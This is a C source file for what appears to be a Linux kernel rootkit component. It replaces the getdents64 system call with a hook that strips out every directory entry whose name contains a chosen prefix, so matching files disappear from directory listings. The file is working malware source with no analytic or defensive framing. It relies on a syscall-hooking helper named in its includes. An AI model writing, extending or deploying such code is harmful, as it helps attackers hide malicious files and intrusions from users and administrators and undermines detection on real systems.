#include <asm/unistd_64.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <asm/syscall.h>
#include <linux/fdtable.h>
#include <linux/namei.h>

#include "fake_syscalls.h"
#include "hooker.h"

asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
{
    struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *curr_dirent;
    unsigned short curr_len;
    char *buffer;
    unsigned long setback = 0;
    unsigned long pos;
    long len;
    unsigned long ret;

    len = call_original_syscall(__NR_getdents64, regs);

    if (len < 0)
        return len;

    buffer = kmalloc(len, GFP_KERNEL);

    ret = copy_from_user(buffer, dirent, len);

    for (pos = 0; pos < len; pos += curr_len)
    {
        curr_dirent = (struct linux_dirent64 *)(buffer + pos);
        curr_len = curr_dirent->d_reclen;

        if (strstr(curr_dirent->d_name, TAINTED_PREFIX))
            setback += curr_len;
        else if (setback)
            memcpy((void *)((unsigned long)curr_dirent - setback), curr_dirent, curr_len);
    }

    memset(buffer + len - setback, 0, setback);

    ret = copy_to_user(dirent, buffer, len);

    kfree(buffer);

    return len - setback;
}
